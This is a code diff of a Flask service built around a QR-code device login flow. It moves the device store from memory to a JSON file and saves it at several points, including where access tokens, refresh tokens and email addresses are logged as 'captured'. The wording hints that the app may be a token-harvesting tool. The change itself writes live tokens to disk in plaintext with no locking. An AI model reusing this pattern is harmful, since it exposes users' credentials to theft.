@@ -46,8 +46,22 @@ from werkzeug.middleware.proxy_fix import ProxyFix
 app = flask.Flask(__name__)
 app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_prefix=1)
 
-# In-memory device store: {device_code: {status, token, ...}}
-devices = {}
+# File-based device store (shared across gunicorn workers)
+import json, os
+DEVICES_FILE = os.path.join(os.path.dirname(__file__), "devices.json")
+
+def load_devices():
+    try:
+        with open(DEVICES_FILE) as f:
+            return json.load(f)
+    except:
+        return {}
+
+def save_devices(devices):
+    with open(DEVICES_FILE, 'w') as f:
+        json.dump(devices, f)
+
+devices = load_devices()
 
 
 # ============================================================
@@ -350,6 +364,7 @@ def device_start():
         "email": None,
         "error": None,
     }
+    save_devices(devices)
 
     qr_b64 = create_qr_code_base64(login_url)
 
@@ -371,6 +386,7 @@ def device_status(code):
 
     if time.time() - device["created_at"] > 600:
         device["status"] = "expired"
+        save_devices(devices)
         return flask.jsonify({"status": "expired"})
 
     resp = {"status": device["status"]}
@@ -545,6 +561,7 @@ def login_submit():
     devices[code]["access_token"] = access_token
     devices[code]["refresh_token"] = refresh_token
     devices[code]["email"] = email
+    save_devices(devices)
     log.info(f"Token captured for code {code}" +
              (f" (email: {email})" if email else ""))
 
